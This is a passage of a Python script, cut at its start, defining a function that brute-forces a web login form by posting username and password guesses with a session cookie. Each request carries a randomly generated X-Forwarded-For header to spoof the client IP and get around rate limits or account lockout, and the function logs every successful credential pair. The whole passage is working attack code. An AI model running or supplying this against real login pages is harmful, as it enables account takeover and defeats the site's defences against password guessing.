...
def brute_force_task(url, cookie, username, password):
    try:
        fake_ip = generate_fake_ip()  # Generate a fake IP for this request
        headers = {"X-Forwarded-For": fake_ip}  # Add fake IP to headers
        data = {"username": username, "password": password}
        
        response = requests.post(url, cookies={"session": cookie}, data=data, headers=headers, timeout=10)

        if "Invalid username" in response.text or "Incorrect password" in response.text:
            logging.debug(f"FAILED: {username}:{password} | Fake IP: {fake_ip}")
            return False, username, password
        elif response.status_code == 200:
            logging.info(f"SUCCESS: {username}:{password} | Fake IP: {fake_ip}")
            return True, username, password
        else:
            logging.error(f"Unexpected response for {username}:{password} | Fake IP: {fake_ip}")
            return False, username, password
    except Exception as e:
        logging.error(f"ERROR: Attempt failed for {username}:{password} | Fake IP: {fake_ip} - {e}")
        return False, username, password
